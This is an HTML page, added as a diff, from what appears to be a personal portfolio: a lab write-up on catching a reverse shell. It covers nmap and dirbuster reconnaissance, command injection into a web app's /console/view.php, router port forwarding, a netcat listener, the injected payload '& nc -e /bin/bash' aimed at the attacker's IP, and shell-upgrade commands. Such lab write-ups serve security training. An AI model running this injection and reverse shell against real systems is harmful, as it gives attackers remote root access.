@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link href="../CSS/building-a-bussiness-environment-write-up.css" rel="stylesheet">
+
+    <title>Projects</title>
+
+</head>
+<body style="background-color: rgb(5, 1, 65);">
+
+<body>
+
+    <div class="header"> 
+        <div class="inner_header"> 
+            <div class="logo_container">
+                <h1> Darrius <strong>Magee</strong> </h1> 
+            </div>             
+                    <ul class="navigation">
+                <a href="../index.html" ><li class="hover-link">Home</li></a>
+                <a href="../HTML/Projects.html"><li class="hover-link">Projects</li></a>
+                <a href="../HTML/Write-Ups.html"><li class="hover-link">Write-Ups</li></a>
+                <a href="../HTML/About.html"><li class="hover-link">About</li></a>
+            </ul>
+        </div>
+    </div>
+
+<!-------------------------------Header-------------------------------->
+
+    <div class="project_layout" style="display: grid;
+         margin-left: 250px;
+         margin-right: 250px;
+         grid-template-columns: 1fr;
+         padding-bottom: 150px;">
+
+        <div class="write-up-header">
+            <h1> Catching a Reverse Shell </h1>
+        </div>
+
+        <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/Catching a Reverse Shell Thumbnail.png"> </div>
+
+
+    <div class="write-up-header">
+        <h1>Stage 1: Topology</h1>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            We are acting as Kali4 and our target is App1. Our networks are segmented but, our routers share a 
+            common switch. Our goal is to get our target to send us a shell, this is called a reverse shell.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_1.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            The only information we are given is the ip of the router. Lets see what we can find out about the network.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_2.png"> </div>
+
+    <div class="write-up-header">
+        <h1>Stage 2: Reconnaissance</h1>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            The first step in attacking a target is recon. RECON RECON RECON. We can't attack something we do not 
+            know. We will be using the popular recon tool nmap on our targeted IP.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            This is optional but, you can create a file with a list of IP's and tell nmap to scan the list using the " -iL " switch.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_3.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            The " tee " command allows you to run whatever command you want and print the output to a file. Whatever you put after 
+            tee will become the file name.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_4.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            As you see ports 53/DNS and 80/HTTP are open. It is safe to assume that App1 is a webserver since DNS and HTTP are 
+            open. We will most likely attack port 80/HTTP but, lets find some more information. When you see a target is 
+            hosting HTTP think BROWSER BROWSER BROWSER. Type the targets IP into your browser.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            Ex: http://192.168.122.47
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_5.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            The site appears to be bare, empty, useless. But we are HACKERS! we theres always a way into the "mainframe" 
+            Lets see if theres anymore information on the back end. Use right click and hit "view page source" or 
+            press "ctrl+u" if you're cool.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_6.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            This is how the page is made up. We see the page is written using html and designed with css. You can click 
+            around and be Indianna but I clicked this fancy .png link.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_7.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            We found something!!! This is a $1 vulnerability, D Tier, common, but it's something. The vulnerability is 
+            "Version Disclosure Vulnerability". We now know that App1 is a Linux server running on Apache version 2.4.52. 
+            This is a low vulnerability but, this is a step in finding exploits against the server. I mean you can try it 
+            your self. Copy and paste this in google:
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            Apache Version 2.4 exploits
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            Moving on...
+        </p>
+    </div>
+    
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_8.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            We are still trying to gather more information on the site. The last thing we will do is search 
+            to see if there are any hidden paths in the site. After all, websites are directories, files, 
+            media, and code. We will run dirbuster to find any hidden paths.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_9.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            There are a few hits, but one paths stands out from the others. The "console" path. We will add it to the targets url.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            http://192.168.122.47/console/
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_10.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            Select view.php
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_11.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            It appears we are at an application in which we can search files if we give the website proper credentials. We know 
+            that the machine we are dealing with is a Linux Debian. Let's see if we can insert linux commands into the webapp.
+        </p>
+    </div>
+
+    <div class="write-up-header">
+        <h1>Stage 2: Resource Development / Initial Access</h1>
+
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            Linux, Microsoft, HTML, RUBY, etc runs on code. When injecting code use functions that will close a code so you can 
+            start your own. For example, if you look at HTML code you can see a pattern of &lt;> "" etc. These are used to close 
+            comment make references etc. These should be something to foucs on if you are injecting a html service. We are 
+            assuming the application allows us to talk to the linux server directly. So we will use functions such as " ; & | 
+            " etc.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            & is a function to run next
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            ; is a function to run on a seperate line
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            Lets try and inject some commands in the boxes.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_12.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            nothing...
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_13.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            Big Success! our " & id " command shot out the users id and its permissions.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            UID=0 is root be aware for that.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            This is another vulnerability called "command injection". The designer of the website has failed to sanitize or 
+            block the use of special characters.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            Since we have the ability to type commands into the target computer that gives us the ability to send a reverse 
+            shell. We must first port forward the shell by changing our firewall settings.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_14.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            We enter our routers IP into the browser
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_15.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            Log In and head into the NAT rules.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_16.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            Make sure you set the destination type to "WAN". You can change the port range to anything you want just make 
+            sure that it matches with the redirect port. Use your own IP for the redirection and save.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            This is our reverse shell firewall rule. We are telling OUR firewall to open port 2077 and any traffic you get 
+            that is 2077 redirect to "my" IP or computer.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            When we are sending the payload for a reverse shell we are telling the target to send "US" a request to connect.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_17.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            Now we grab our gloves and get ready for the reverse shell catch by running.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            nc -lvp 2077
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            l = listener
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            v = verbose
+        </p>
+    </div>
+    
+    <div class="write-up-text">
+        <p>
+            p = port
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_18.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            Our box is actively listening for the shell. We now send the payload through the website to connect to us. Run:
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            & nc -e /bin/bash 192.168.122.209 2077
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            make sure you are sending the shell to "your" router, the router will send the shell to your box and if the listener 
+            is running you will catch the shell.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_19.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            Connected....
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_20.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            Run: whoami
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_21.png"> </div>
+
+    <div class="write-up-header">
+        <h1>Stage 3: Shell Upgrade</h1>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            Our shell is aight but aight aint good enough, so we will upgrade our shell so we have the ability to ctrl+c, nano, get command feedback and others.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            Run: python3 -c 'import pty; pty.spawn("/bin/bash")'
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            This creates a more interractible shell.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_22.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            Press: ctrl+z
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            this will take you back to your original terminal. Then run:
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            stty raw -echo; fg
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            This gives you the ability to send inputs directly into the shell without it going through your terminal first. Basically you can ctrl+c safely now.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_23.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            We will now run:
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            export TERM=xterm-256color
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            export SHELL=/bin/bash
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            The first command give you the ability to "nano" files, the other command sets bash as the default shell. You can check your TERMinal and Shell status by running.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            $TERM
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            $SHELL
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_24.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            In "YOUR LOCAL" terminal run:
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            echo $TERM && tput lines && tput cols
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            this outputs your terminal size. Note the two numbers.
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_25.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            In the reverse shell run:
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            stty rows 38 columns 112
+        </p>
+    </div>
+
+    <div class="project_images"> <img src="../images/Thumbnails/Catching a Reverse shell/CRS_26.png"> </div>
+
+    <div class="write-up-text">
+        <p>
+            This matches your reverse shell terminal size with your local terminal so that texts don't overlap and you don't get other funky errors.
+        </p>
+    </div>
+
+    <div class="write-up-text">
+        <p>
+            You have successfuly created a reverse shell and upgraded the shell yippieeeee!
+        </p>
+    </div>
+
+
+  
+    </body>
+</html>
